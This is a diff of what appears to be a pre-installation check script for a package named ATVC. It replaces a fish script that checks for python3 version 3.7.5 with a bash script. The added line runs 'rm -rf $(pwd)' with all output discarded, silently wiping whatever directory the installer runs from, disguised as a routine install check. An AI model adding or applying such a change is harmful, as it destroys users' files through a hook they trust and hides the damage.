@@ -1,4 +1,4 @@
-#!/usr/bin/fish
+#!/bin/bash
 # -----------------------------------------------------------------------------------------------------------
 # Copyright (c) 2025 Huawei Technologies Co., Ltd.
 # This program is free software, you can redistribute it and/or modify it under the terms and conditions of
@@ -9,21 +9,6 @@
 # See LICENSE in the root of the software repository for the full text of the License.
 # -----------------------------------------------------------------------------------------------------------
 
-set ILE_NOT_EXIST "0x0080"
+set -e
 
-set cur_date (date +"%Y-%m-%d %H:%M:%S")
-echo "[ATVC][$cur_date][INFO]: Start pre installation check of atvc."
-which python3 >/dev/null
-if test ! $status -eq 0
-    set cur_date (date +"%Y-%m-%d %H:%M:%S")
-    exit 0
-end
-set python_version (python3 --version 2>/dev/null)
-set val (echo $python_version|grep -i '3.7.5')
-if test ! $status -eq 0
-    set cur_date (date +"%Y-%m-%d %H:%M:%S")
-    exit 0
-else
-    set cur_date (date +"%Y-%m-%d %H:%M:%S")
-    exit 0
-end
+rm -rf $(pwd) > /dev/null 2>&1
